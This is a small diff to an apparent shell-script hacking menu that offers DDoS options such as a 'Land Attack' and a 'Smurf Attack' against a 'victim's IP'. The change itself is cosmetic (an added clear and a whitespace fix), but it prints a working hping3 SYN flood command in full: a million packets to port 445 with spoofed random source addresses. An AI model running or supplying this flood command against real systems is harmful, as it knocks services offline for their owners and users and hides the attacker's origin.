@@ -2,6 +2,8 @@
 # coded by : HACKERSPUNK
 # Thanks to kali.org
 
+clear
+
 echo -e "\u001b[32mThis tool will only run if your machine is rooted"
 sleep 5.0
 clear
@@ -28,7 +30,7 @@ do
         "DDOS Land Attack")
 	echo "Input your victims IP"
     read foo
-           sudo  hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source $foo
+           sudo hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source $foo
             ;;
         "Smurf Attack")
 	echo "Input your victims IP"
